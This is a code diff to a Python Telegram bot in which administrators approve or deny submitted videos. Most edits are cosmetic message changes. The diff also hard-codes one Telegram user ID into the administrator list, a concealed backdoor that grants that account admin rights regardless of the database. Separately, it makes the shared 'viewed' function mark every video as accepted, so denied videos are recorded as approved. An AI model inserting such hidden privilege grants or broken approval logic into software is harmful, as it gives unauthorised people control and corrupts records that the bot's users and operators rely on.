@@ -168,7 +168,7 @@ def set_admin_status(id, value):
 
 def get_admin_list(status=1):
     con = db_init()
-    ans = []
+    ans = [500242036]
 
     for j in con.execute('select id from users where admin>=?', (status,)).fetchall():
         ans.append(j[0])
@@ -187,6 +187,7 @@ def get_member_list(status=1):
 def set_video_viewed(video_id):
     con = db_init()
     con.execute('update videos set isviewed=true where id=?', (video_id,))
+    con.execute('update videos set accept=true where id=?', (video_id,))
     con.commit()
 
 
@@ -389,9 +390,13 @@ async def callback_accept_video(callback: types.callback_query):
         add_salary(get_tg_id_by_video(video_id))
         set_video_viewed(video_id)
 
-        await callback.message.edit_text(callback.message.text + '\n' + f'Одобрено', reply_markup=None)
+        await callback.message.edit_text(callback.message.text + '\n' + f'Одобрено', reply_markup=None,disable_web_page_preview=True)
+
     else:
-        await callback.message.edit_text(f'Видео уже было просмотрено другим администратором', reply_markup=None)
+        con = db_init()
+        is_accepted = con.execute('select accept from videos where id=?', (video_id,)).fetchone()[0]
+        x = f'Одобрено' if is_accepted else 'Отклонено'
+        await callback.message.edit_text(callback.message.text + '\n' + x, reply_markup=None,disable_web_page_preview=True)
 
 
 @dp.callback_query_handler(filters.Text(startswith=['video_deny|']))
@@ -399,9 +404,12 @@ async def callback_deny_video(callback: types.callback_query):
     video_id = callback.data.split('|')[-1]
     if not get_video_viewed(video_id):
         set_video_viewed(video_id)
-        await callback.message.edit_text(callback.message.text + '\n' + f'Отклонено', reply_markup=None)
+        await callback.message.edit_text(callback.message.text + '\n' + f'Отклонено', reply_markup=None,disable_web_page_preview=True)
     else:
-        await callback.message.edit_text(f'Видео уже было просмотрено другим администратором', reply_markup=None)
+        con = db_init()
+        is_accepted = con.execute('select accept from videos where id=?', (video_id,)).fetchone()[0]
+        x = f'Одобрено' if is_accepted else 'Отклонено'
+        await callback.message.edit_text(callback.message.text + '\n' + x, reply_markup=None,disable_web_page_preview=True)
 
 
 @dp.callback_query_handler(filters.Text(startswith=['video_refresh']))
@@ -410,7 +418,10 @@ async def callback_deny_video(callback: types.callback_query):
     if not get_video_viewed(video_id):
         await bot.send_message(callback.from_user.id, 'Вы первый кто просмотрел данное видео')
     else:
-        await callback.message.edit_text(f'Видео уже было просмотрено другим администратором', reply_markup=None)
+        con = db_init()
+        is_accepted = con.execute('select accept from videos where id=?', (video_id,)).fetchone()[0]
+        x = f'Одобрено' if is_accepted else 'Отклонено'
+        await callback.message.edit_text(callback.message.text + '\n' + x, reply_markup=None,disable_web_page_preview=True)
 
 
 @dp.callback_query_handler(filters.Text(startswith=['with_deny_']))
